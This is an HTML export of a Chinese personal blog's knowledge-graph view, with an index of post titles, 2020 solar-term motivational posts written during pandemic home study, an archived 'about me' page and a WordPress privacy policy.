                        </span>
                        <span>为什么个体域变化引入特性谓词时，不同量词的命题变化不一样？</span>
                    </a>
                </li>
                
                <li data-index="3449001268" style="order: 100">
                    <a href="#3449001268">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_数学与算法);">⬤</span>
                            
                        </span>
                        <span>「蕴含」与「等价」自然语言表达的理解</span>
                    </a>
                </li>
                
                <li data-index="1464127505" style="order: 101">
                    <a href="#1464127505">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_工具箱);">⬤</span>
                            
                            <span style="color: var(--n_核心协同);">⬤</span>
                            
                        </span>
                        <span>对电脑端微信小程序抓包</span>
                    </a>
                </li>
                
                <li data-index="2445395019" style="order: 102">
                    <a href="#2445395019">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_工具箱);">⬤</span>
                            
                            <span style="color: var(--n_核心协同);">⬤</span>
                            
                        </span>
                        <span>Linux 使用 nohup 后台运行程序</span>
                    </a>
                </li>
                
                <li data-index="888931094" style="order: 103">
                    <a href="#888931094">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_工具箱);">⬤</span>
                            
                            <span style="color: var(--n_核心协同);">⬤</span>
                            
                        </span>
                        <span>go-cqhttp 部署与简单编程</span>
                    </a>
                </li>
                
                <li data-index="3298282303" style="order: 104">
                    <a href="#3298282303">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_嵌入式);">⬤</span>
                            
                        </span>
                        <span>DHT11 驱动程序</span>
                    </a>
                </li>
                
                <li data-index="746142122" style="order: 105">
                    <a href="#746142122">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                            <span style="color: var(--n_有感而发);">⬤</span>
                            
                        </span>
                        <span>第一次写 Hexo 插件</span>
                    </a>
                </li>
                
                <li data-index="3315008132" style="order: 106">
                    <a href="#3315008132">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>CSAPP LAB-1 位操作</span>
                    </a>
                </li>
                
                <li data-index="3522416439" style="order: 107">
                    <a href="#3522416439">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>CSAPP LAB-2 二进制炸弹实验</span>
                    </a>
                </li>
                
                <li data-index="1735947091" style="order: 108">
                    <a href="#1735947091">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                    </a>
                </li>
                
                <li data-index="165066519" style="order: 109">
                    <a href="#165066519">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>CSAPP LAB-4 代码优化</span>
                    </a>
                </li>
                
                <li data-index="1051831239" style="order: 110">
                    <a href="#1051831239">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>CSAPP LAB-5 手写动态存储分配器</span>
                    </a>
                </li>
                
                <li data-index="1135491326" style="order: 111">
                    <a href="#1135491326">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_工具箱);">⬤</span>
                            
                            <span style="color: var(--n_核心协同);">⬤</span>
                            
                        </span>
                        <span>Typora 免费版本 or 正式版的绿色使用</span>
                    </a>
                </li>
                
                <li data-index="2982342308" style="order: 112">
                    <a href="#2982342308">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_嵌入式);">⬤</span>
                            
                        </span>
                        <span>RM 和 EDF 任务调度算法在 μCOSII 上的实现</span>
                    </a>
                </li>
                
                <li data-index="2009578670" style="order: 113">
                    <a href="#2009578670">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_数学与算法);">⬤</span>
                            
                        </span>
                        <span>计算汉明重量的两个技巧性算法</span>
                    </a>
                </li>
                
                <li data-index="565697069" style="order: 114">
                    <a href="#565697069">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SpringBoot 的原理以及写一个自定义 Starter</span>
                    </a>
                </li>
                
                <li data-index="2985240736" style="order: 115">
                    <a href="#2985240736">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SpringBoot 项目的上线方式</span>
                    </a>
                </li>
                
                <li data-index="3118126311" style="order: 116">
                    <a href="#3118126311">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_工具箱);">⬤</span>
                            
                            <span style="color: var(--n_核心协同);">⬤</span>
                            
                        </span>
                        <span>利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）</span>
                    </a>
                </li>
                
                <li data-index="2896927132" style="order: 117">
                    <a href="#2896927132">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SPI 概念及案例实践（上）</span>
                    </a>
                </li>
                
                <li data-index="3886683086" style="order: 118">
                    <a href="#3886683086">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SPI 概念及案例实践（下）</span>
                    </a>
                </li>
                
                <li data-index="1713466548" style="order: 119">
                    <a href="#1713466548">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SpringBoot 中的 IOC &amp; DI 入门</span>
                    </a>
                </li>
                
                <li data-index="2487324783" style="order: 120">
                    <a href="#2487324783">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_undefined);">⬤</span>
                            
                        </span>
                        <span>SpringBoot 中的配置</span>
                    </a>
                </li>
                
                <li data-index="3790495434" style="order: 121">
                    <a href="#3790495434">
                        <span class="record-type-points">
                            
                            <span style="color: var(--n_博客相关);">⬤</span>
                            
                            <span style="color: var(--n_hexo);">⬤</span>
                            
                        </span>
                        <span>Hexo 博客与 Waline 评论区实现外链跳转中间页</span>
                    </a>
                </li>
                
            </ul>
        </details>

        <details class="menu-view" open="open">
            <summary class="menu-title">
                View
            </summary>

            <button onclick="window.location.replace(window.location.pathname)">
                Reset the view
            </button>

            <button id="view-save">
                Set URL to current view
            </button>

            <span class="tooltip">?
                <span class="tooltiptext">Apply the current state of the interface (selected record, filters, focus…) to the URL, which can then be used to access the current view.
</span>
            </span>

            <div class="menu-view-container" id="views-container">
            
                
            
            </div>
        </details>

        <details class="menu-controls">
            <summary class="menu-title">
                Graph parameters
            </summary>

            <ul class="menu-controls-list">
                <li>
                    <label>
                        <input type="checkbox" checked onchange="linksDisplayToggle(this.checked)">
                        Display links
                        <span class="badge">126</span>
                    </label>
                </li>
                <li>
                    <label>
                        <input type="checkbox" checked onchange="labelDisplayToggle(this.checked)">
                        Display labels
                    </label>
                </li>
                <li>
                    <label>
                        <input type="checkbox" checked
                            onchange="graphProperties.graph_highlight_on_hover = this.checked">
                        Highlight on hover
                    </label>
                </li>
            </ul>

            

            <article class="menu-controls-container">
                <p class="menu-controls-title">
                    Forces
                    <span class="tooltip">?
                        <span class="tooltiptext"></span>
                    </span>
                </p>
                
            <form oninput="graphProperties.attraction_force = range.value; updateForces()">
                <label>repulsion</label>
                <input type="number" value="600" name="number" min="50" max="600" oninput="range.value = number.value"/>
                <input type="range" min="50" max="600" value="600" name="range" step="0.1" oninput="number.value = range.value"/>
            </form>
            
                
            <form oninput="graphProperties.attraction_distance_max = range.value; updateForces()">
                <label>max distance</label>
                <input type="number" value="507" name="number" min="200" max="800" oninput="range.value = number.value"/>
                <input type="range" min="200" max="800" value="507" name="range" step="0.1" oninput="number.value = range.value"/>
            </form>
            
                
            <form oninput="graphProperties.attraction_vertical = range.value; updateForces()">
                <label>vertical attraction</label>
                <input type="number" value="0.36" name="number" min="0" max="1" oninput="range.value = number.value"/>
                <input type="range" min="0" max="1" value="0.36" name="range" step="0.01" oninput="number.value = range.value"/>
            </form>
            
                
            <form oninput="graphProperties.attraction_horizontal = range.value; updateForces()">
                <label>horizontal attraction</label>
                <input type="number" value="0.36" name="number" min="0" max="1" oninput="range.value = number.value"/>
                <input type="range" min="0" max="1" value="0.36" name="range" step="0.01" oninput="number.value = range.value"/>
            </form>
            
            </article>

            <article class="menu-controls-container">
                <p class="menu-controls-title">
                    Labels
                </p>
                
            <form oninput="graphProperties.text_size = range.value; updateFontsize()">
                <label>font size</label>
                <input type="number" value="6" name="number" min="2" max="15" oninput="range.value = number.value"/>
                <input type="range" min="2" max="15" value="6" name="range" step="0.5" oninput="number.value = range.value"/>
            </form>
            
            </article>

            
            <article class="menu-controls-container">
                <p class="menu-controls-title">Mode de focus</p>
                <select name="focus_mode" id="focus-mode-select">
                    <option value="directed">Tous</option>
                    <option value="inbound">Entrant</option>
                    <option value="outbound">Sortant</option>
                </select>
            </article>
            
        </details>

        <footer class="menu-footer">
            

            <a href="#help">
                Help
            </a>

            <a href="#credits">
                
                    Made with Cosma – About
                
            </a>
        </footer>
    </aside>

    

    <div class="graph-wrapper" style="background-color: #ffffff">
        <svg id="graph-canvas">
            <defs>
                <marker id="arrow" viewBox="0 0 10 10" refX="22" refY="5" markerUnits="strokeWidth" markerWidth="5" markerHeight="5" orient="auto">
                    <path d="M 0 0 L 10 5 L 0 10 z"></path>
                </marker>
                <filter id="double">
                    <feMorphology in="SourceGraphic" result="a" operator="dilate" radius="0.2"></feMorphology>
                    <feComposite in="SourceGraphic" in2="a" result="xx" operator="xor"></feComposite>
                </filter>
                
            </defs>
        </svg>
    </div>

    

    <div class="graph-controls" id="graph-controls">
        <div class="graph-controls-section graph-controls-zoom">
            <button onclick="zoomLess()">-</button>
            <button onclick="zoomReset()">Reset (R)</button>
            <button onclick="zoomMore()">+</button>
        </div>

        
        <div class="graph-controls-section graph-controls-focus">
            <span class="graph-control-label">
                <input id="focus-check" type="checkbox" name="checkbox">
                <label for="focus-check">Focus (F)</label>
            </span>

            <input id="focus-input" type="range" min="1" max="2" value="1" name="focus_range" step="1" />
        </div>
        

        
        <div class="graph-controls-section graph-timeline">
            <span class="graph-control-label">
                <input id="timeline-checkbox" type="checkbox" name="checkbox">
                <label for="timeline-checkbox">Mode chronologique</label>
            </span>

            <form id="timeline-form">
                <output name="timeline_output">8/22/2020</output>
                <input
                    type="range"
                    name="timeline_range"
                    min="1598088810"
                    max="1722786026"
                    value="1598088810"
                    list="timeline-ticks"
                >
                <datalist id="timeline-ticks"></datalist>
            </form>
        </div>
        
    </div>

    

    <main id="record-container" class="record-container">
        <article class="record active empty-record">
            <p>Cliquez sur un nœud du graphe ou dans un élément de l'index pour ouvrir une fiche.</p>
        </article>
    
        
        <article id="1355609062" class="record">
            <header>
                <h1 class="record-title">家里蹲的二十四节气</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('二十四节气');">二十四节气</button>
                    
                    <button class="btn" onclick="activeTag('疫情');">疫情</button>
                    
                    <button class="btn" onclick="activeTag('日食');">日食</button>
                    
                    <button class="btn" onclick="activeTag('学习');">学习</button>
                    
                    <button class="btn" onclick="activeTag('TJU');">TJU</button>
                    
                    <button class="btn" onclick="activeTag('Canva');">Canva</button>
                    
                    <button class="btn" onclick="activeTag('PPT');">PPT</button>
                    
                    <button class="btn" onclick="activeTag('微信');">微信</button>
                    
                    <button class="btn" onclick="activeTag('微信公众号');">微信公众号</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/22/2020</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231021170856.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>整天呆在家的人多少出现点问题</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>50ccf3e6</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!hint] 导读提示<br>
2020 年初，疫情开始实质性影响我们的生活，我的大一下学期在家里度过。家里蹲期间，整个人的状态很松散随性，对线上学习事物动力不足，导致这期间天天焦虑，所以才会产生下文各种各样自我感动的留言。但也是这段时期给我许多自由探索的空间，我使用 VB 编写了 Excel 项目，深入了解 PPT 制作，上手平面设计、视频剪辑，接触并捣鼓自己的 Golly 小项目，以及微信公众号等等。</p>
<p>下文就是微信公众号中按 24 节气勉励自己的 9 篇文章。由文章封面和文本内容组成。大部分图文组合均由自己组合创作。</p>
<p>本文创建时间为 2023 年 10 月 22 日，除了新增「导读提示」外还增加「更多信息」章节。本文正文文本格式直接使用原文 HTML 内容，图片直接使用素材除去水印，<em>阅读原文</em>链接整理到「更多信息」章节中。</p>
</blockquote>
<h1>谷雨——雨生百谷</h1>
<p><em>2020-04-19 07:10</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%B0%81%E9%9D%A2-%E8%B0%B7%E9%9B%A820200417.webp" alt="封面-谷雨20200417.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E8%B0%B7%E9%9B%A8-%E4%B8%8D%E8%A6%81%E8%B7%8C%E5%85%A5%E6%B7%B1%E6%B8%8A%E3%80%82.webp" alt="谷雨-不要跌入深渊。.png|475"></p>
<div class="rich_media_content js_underline_content
                       " id="js_content" style="visibility: visible;"><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong>从今天起，每个二十四节气，</strong></span></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong>将推送个人的时段格言</strong></span></p><p style="text-align: center;"><strong style="color: rgb(64, 118, 0);">一年也许会有很多不同，但是最起码，</strong></p><p style="text-align: center;"><strong style="color: rgb(64, 118, 0);">有这二十四个改变</strong><span style="color: rgb(64, 118, 0);"><strong><br></strong></span></p><p style="text-align: center;"><strong style="color: rgb(64, 118, 0);"><br></strong></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong>激励自己，也是激励大家<br></strong></span></p><p style="text-align: center;"><br></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong>共勉</strong></span><br></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong><br></strong></span></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong><br></strong></span></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong><br></strong></span></p><p style="text-align: center;"><span style="color: rgb(64, 118, 0);"><strong>。</strong></span></p></div>
<h1>立夏——万物至此皆长大</h1>
<p><em>2020-05-05 07:00</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/lixia.webp" alt="lixia.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E4%B8%83%20(1).webp" alt="七 (1).png|475"></p>
<p><span style="color: rgb(61, 167, 66);"><strong>五月，此时的青年应是朝气蓬勃。</strong></span><br></p>
<h1>小满——小满江河满</h1>
<p><em>2020-05-20 09:24</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%9A%84%E8%AE%BE%E8%AE%A1.webp" alt="未命名的设计.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20200520%E5%B0%8F%E6%BB%A1.webp" alt="20200520小满.png|475"></p>
<p style="text-align: center;"><span style="font-size: 18px;color: rgb(214, 168, 65);"><strong><span style="color: rgb(214, 168, 65);font-size: 18px;font-family: arial, 宋体, sans-serif;text-align: start;text-indent: 28px;background-color: rgb(255, 255, 255);">从今天起，做一个幸福的人</span></strong></span></p>
<h1>芒种——播种有芒之谷</h1>
<p><em>2020-06-05 07:04</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%9A%84%E8%AE%BE%E8%AE%A1%20(2).webp" alt="未命名的设计 (2).png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E7%AC%AC2%20%E7%82%B9%205%E5%AD%A6%E6%9C%9F%20%E3%80%82.webp" alt="第2 点 5学期 。.png|475"></p>
<p style="text-align: center;"><strong><span style="color: rgb(255, 169, 0);">暑假仍需努力！</span></strong><br></p>
<h1>夏至——日长之至，日影短至</h1>
<p><em>2020-06-21 17:13</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%A4%8F%E8%87%B3%E6%97%A5.webp" alt="夏至日.png|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%A4%8F%E8%87%B3%E5%AD%A6%E4%B9%A0%E4%B8%8D%E3%80%82.webp" alt="夏至学习不。.png|475"></p>
<p style="text-align: center;"><strong>临近期末，暑假还是有课要学习的。</strong><br></p>
<p>今日有日食，时隔 11 年，再次“张目对日”（⚠ 此举危险）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021165704.webp" alt="image.png|425"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021165713.webp" alt="image.png|425"></p>
<p>愿世界和平。</p>
<h1>小暑——上蒸下煮</h1>
<p><em>2020-07-06 14:44</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E6%96%B0%E5%BB%BA%20Microsoft%20PowerPoint%20%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF.webp" alt="新建 Microsoft PowerPoint 演示文稿.jpg|475"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/rwrwwew.webp" alt="rwrwwew.jpg|475"></p>
<div class="rich_media_content js_underline_content
                       " id="js_content" style="visibility: visible;"><p style="text-align: center;"><span style="color: rgb(61, 167, 66);"><strong>学习进行时<br></strong></span></p><p style="text-align: center;"><span style="color: rgb(61, 167, 66);"><strong>本篇文章由PPT制作，现学现用</strong></span><br></p></div>
<h1>大暑——炎热至极</h1>
<p><em>2020-07-22 23:38</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021170856.webp" alt="image.png|475"></p>
<p>愿今年的高考生在明天能有当时的我一样的好运气。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021170100.webp" alt="image.png|425"></p>
<p>暑假快乐。</p>
<h1>立秋——阴气始下，万物收</h1>
<p><em>2020-08-07 00:09</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021170954.webp" alt="image.png|475"></p>
<p>倒计时的勤勉。</p>
<p>最后 20 天，追赶吧！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021170139.webp" alt="image.png|450"></p>
<h1>处暑——防秋老虎</h1>
<p><em>2020-08-22 17:33</em></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231021171049.webp" alt="image.png|475"></p>
<p>调整作息，预热学习，准备出发！</p>
<p>不做完美主义，但求跟紧实际，稳追稳打争第一！</p>
<h1>更多信息</h1>
<ul>
<li>文章中阅读原文链接：
<ul>
<li><a href="https://baike.baidu.com/item/%E8%B0%B7%E9%9B%A8/6959?fr=aladdin">谷雨（二十四节气之一）_百度百科 (baidu.com)</a></li>
<li><a href="https://baike.baidu.com/item/%E7%AB%8B%E5%A4%8F/7587?fr=aladdin">立夏（二十四节气之一）_百度百科 (baidu.com)</a></li>
<li><a href="https://baike.baidu.com/item/%E5%B0%8F%E6%BB%A1/35961?fr=aladdin">小满（二十四节气之一）_百度百科 (baidu.com)</a></li>
<li><a href="https://baike.baidu.com/item/%E8%8A%92%E7%A7%8D/487968?from=kg_qa">芒种（二十四节气之一）_百度百科 (baidu.com)</a></li>
<li><a href="https://baike.baidu.com/item/%E5%A4%8F%E8%87%B3/12033?fr=aladdin">夏至（二十四节气之一）_百度百科 (baidu.com)</a></li>
<li><a href="https://baike.baidu.com/item/%E5%B0%8F%E6%9A%91/488269?fr=aladdin">小暑（二十四节气之一）_百度百科 (baidu.com)</a></li>
</ul>
</li>
<li>除了小满文章忘记署名「二十四只」外，每篇文章均以「二十四只   小钦钦 qin」作为文章抬头。</li>
<li>这些文章占据了目前 9/19 的公众号文章。</li>
<li>「处暑——防秋老虎」文章为公众号最后一篇文章。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3096264560" class="record">
            <header>
                <h1 class="record-title">旧页面-关于我</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/10/2022</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b88d3f70</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/achived-cover.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Warning] 这是一篇归档文章<br>
本页面已停止更新，仅起历史归档作用。</p>
</blockquote>
<h1>Hexo 建站版</h1>
<blockquote>
<p>修改时间：2023</p>
</blockquote>
<p>Hello！😀</p>
<p>我是一枚在校大学生🏫，目前就读于海棠花盛开的地方。平时喜欢搞事，也喜欢分享生活！在这短短几年的代码生涯里，从之前的“懵懂”到现在的刚刚“入门”，中间经历了许多的困难。但是，在解决困难的过程中，我发现至今仍有一条我摸索出来的“铁律”没有违背，那就是<strong>只要你肯花时间，疑惑与错误总会逐渐减少，不会一成不变地成为堵路石</strong>。</p>
<p>程序员的交流社区是庞大的，在中国更不用说。但是，在中国互联网上鲜有优质的社区与优秀的方案。网络上总是充斥着重复、无用、过时、繁琐的帖子，一个人想在中文互联网找到答案，大概率的情况是会淹没在茫茫的无效的回答当中。</p>
<p>为了改善这种情况，我将尽自己微薄的力量，去缓解这个现状。在这个网站中，我会分享自己在大学学习中整理的学习笔记，随时更新自己遇到困难后所采取的解决方案，给自己留下一份记录，也互联网上的其他人提供帮助。</p>
<p>同时，我也将我自己空闲时捣鼓的玩意分享出来，涉及的领域包括但不限于编程、游戏、设计、音乐、艺术。欢迎大家的围观和评论。虽然我不是什么大神大鬼，但我还是不要脸的在个人品牌上不断探索。</p>
<p>就酱，have a nice day！😋❤</p>
<h1>WordPress 建站版</h1>
<blockquote>
<p>建立时间：2022-03-10 23:38:40</p>
</blockquote>
<p>Hello！😀</p>
<p>我是一枚在校大学生🏫，就读于海棠花盛开的地方。平时我乐于学习计算机知识，也喜欢分享生活！在这短短几年的代码生涯里，从之前的“懵懂”到现在的刚刚“入门”，中间经历了许多的困难。但是，在解决困难的过程中，我发现至今仍有一条我摸索出来的“铁律”没有违背，那就是<strong>只要你肯花时间，疑惑与错误总会逐渐减少，不会一成不变地成为堵路石</strong>。</p>
<p>程序员的交流社区是庞大的，在中国更不用说。但是，在中国互联网上鲜有优质的社区与优秀的方案。网络上总是充斥着重复、无用、过时、繁琐的帖子，一个人想在中文互联网找到答案，大概率的情况是会淹没在茫茫的无效的回答当中。（这个过程据说叫💩里掏金）</p>
<p>为了改善这种情况，我将尽自己微薄的力量，去缓解这个现状。在这个网站中，我会分享自己在大学学习中整理的学习笔记，随时更新自己遇到困难后所采取的解决方案，给自己留下一份记录，也互联网上的其他人提供帮助。</p>
<p>同时，我也将我自己空闲时捣鼓的玩意分享出来，涉及的领域包括但不限于编程、游戏、设计、音乐、艺术。欢迎大家的围观和评论。虽然我不是什么大神大鬼，但我还是不要脸的在个人品牌上不断探索。所以......欢迎大家关注我的个人公众号“小钦钦qin”，里边的内容将会不断完善，相信有一天他会同样精彩！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QRCode%E9%80%8F%E6%98%8E.png" alt="|172"></p>
<p>小钦钦qin</p>
<p>这个网站是租用云服务器，并自己配置LAMP环境而建立的，加上买域名啥的花了不少小钱钱。希望各位看客可以多多支(zan)持(zhu)，多多交(biao)流(yang)，咱们互相学习！</p>
<p>就酱，have a nice day！😋❤</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="238315581" class="record">
            <header>
                <h1 class="record-title">旧页面-WordPress 站点隐私政策</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/10/2022</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>e34683d</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/achived-cover.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Warning] 这是一篇归档文章<br>
本页面已停止更新，仅起历史归档作用。</p>
</blockquote>
<p>目录</p>
<ul>
<li><a href="#%E6%88%91%E4%BB%AC%E6%98%AF%E8%B0%81">我们是谁</a></li>
<li><a href="#%E8%AF%84%E8%AE%BA">评论</a></li>
<li><a href="#%E5%AA%92%E4%BD%93">媒体</a></li>
<li><a href="#cookies">Cookies</a></li>
<li><a href="#%E6%9D%A5%E8%87%AA%E5%85%B6%E4%BB%96%E7%BD%91%E7%AB%99%E7%9A%84%E5%B5%8C%E5%85%A5%E5%86%85%E5%AE%B9">来自其他网站的嵌入内容</a></li>
<li><a href="#%E6%88%91%E4%BB%AC%E4%B8%8E%E8%B0%81%E5%85%B1%E4%BA%AB%E6%82%A8%E7%9A%84%E4%BF%A1%E6%81%AF">我们与谁共享您的信息</a></li>
<li><a href="#%E6%88%91%E4%BB%AC%E4%BF%9D%E7%95%99%E5%A4%9A%E4%B9%85%E6%82%A8%E7%9A%84%E4%BF%A1%E6%81%AF">我们保留多久您的信息</a></li>
<li><a href="#%E6%82%A8%E5%AF%B9%E6%82%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9C%89%E4%BB%80%E4%B9%88%E6%9D%83%E5%88%A9">您对您的信息有什么权利</a></li>
<li><a href="#%E6%88%91%E4%BB%AC%E5%B0%86%E6%82%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E5%8F%91%E9%80%81%E5%88%B0%E5%93%AA">我们将您的信息发送到哪</a></li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%9A%90%E7%A7%81%E6%94%BF%E7%AD%96">第三方服务隐私政策</a></li>
<li><a href="#akismet%E5%8F%8D%E5%9E%83%E5%9C%BE%E8%AF%84%E8%AE%BA%E6%9C%8D%E5%8A%A1%E6%8F%92%E4%BB%B6">Akismet反垃圾评论服务插件</a></li>
<li><a href="#clarity">Clarity</a></li>
<li><a href="#popup--maker">Popup Maker</a></li>
<li><a href="#%E7%99%BE%E5%BA%A6%E7%BB%9F%E8%AE%A1">百度统计</a></li>
<li><a href="#%E5%BC%80%E5%BE%80-%E5%8F%8B%E9%93%BE%E6%8E%A5%E5%8A%9B">开往-友链接力</a></li>
</ul>
<p>本隐私政策最后更新时间：<strong><em>2022年4月22日</em></strong></p>
<h4>我们是谁</h4>
<p>站点地址：<a href="http://uuanqin.top">http://uuanqin.top</a><br>
ICP备案号：<a href="https://beian.miit.gov.cn/">津ICP备2022002156号</a><br>
公安联网备案：<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011202000621">津公网安备 12011202000621号</a></p>
<h4>评论</h4>
<p>当访客留下评论时，我们会收集<strong>评论表单所显示的数据</strong>，和<strong>访客的IP地址及浏览器的user agent字符串</strong>来帮助检查垃圾评论。所收集的**电子邮箱信息仅用于接收评论提醒：回复提醒、审核通过提醒等，不会对外公布。**如果您是网站的注册用户，电子邮箱还将用于接收密码重置信息。</p>
<p>由您的电子邮箱地址所生成的匿名化字符串（又称为哈希）可能会被提供给Gravatar服务确认您是否有使用该服务。Gravatar服务的隐私政策可在<a href="https://automattic.com/privacy/">此处</a>查询。当您的评论审核通过后，您的资料图片将在您的评论旁公开展示。</p>
<h4>媒体</h4>
<p>如果您向此网站上传图片，您应当避免上传那些有嵌入地理位置信息（EXIF GPS）的图片。此网站的访客将可以下载并提取此网站的图片中的位置信息。</p>
<h4>Cookies</h4>
<p>如果您在我们的站点上留下评论，您可以选择用cookies保存您的名字、电子邮箱地址和网站地址。它可以让您可以不用在评论时再次填写相关内容而向您提供方便。这些cookies会<strong>保留一年</strong>。</p>
<p>如果您访问我们的登录页，我们会设置一个临时的cookie来确认您的浏览器是否接受cookies。此cookie不包含个人数据，且会在您关闭浏览器时被丢弃。</p>
<p>当您登录时，我们也会设置多个cookies来保存您的登录信息及屏幕显示选项。登录cookies会<strong>保留两天</strong>，而屏幕显示选项cookies会<strong>保留一年</strong>。如果您选择了“记住我”，您的登录状态则会<strong>保留两周</strong>。如果您注销登陆了您的账户，用于登录的cookies将会被移除。</p>
<p>如果您编辑或发布文章，我们会在您的浏览器中保存一个额外的cookie。这个cookie不包含个人数据而只记录了您刚才编辑的文章的ID。这个cookie会<strong>保留一天</strong>。</p>
<p>关于第三方插件使用的cookies信息详见<a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8F%92%E4%BB%B6%E9%9A%90%E7%A7%81%E6%94%BF%E7%AD%96">第三方插件隐私政策</a>。</p>
<h4>来自其他网站的嵌入内容</h4>
<p>此站点上的文章可能会包含嵌入的内容（如视频、图片、文章等）。来自其他站点的嵌入内容的行为和您直接访问这些其他站点没有区别。</p>
<p>这些站点可能会收集关于您的数据、使用cookies、嵌入额外的第三方跟踪程序及监视您与这些嵌入内容的交互，包括在您有这些站点的账户并登录了这些站点时，跟踪您与嵌入内容的交互。</p>
<h4>我们与谁共享您的信息</h4>
<p>网站服务器部署在阿里云，部分媒体文件（<strong>仅存储网页图片，不包含用户数据</strong>）在腾讯云中托管。所有的用户数据将存储在中国大陆<strong>境内</strong>。</p>
<p>若您请求重置密码，您的<strong>IP地址</strong>将包含于密码重置邮件中。</p>
<h4>我们保留多久您的信息</h4>
<p>如果您留下评论，<strong>评论和其元数据</strong>将被无限期保存。我们这样做以便能识别并自动批准任何后续评论，而不用将这些后续评论加入待审队列。</p>
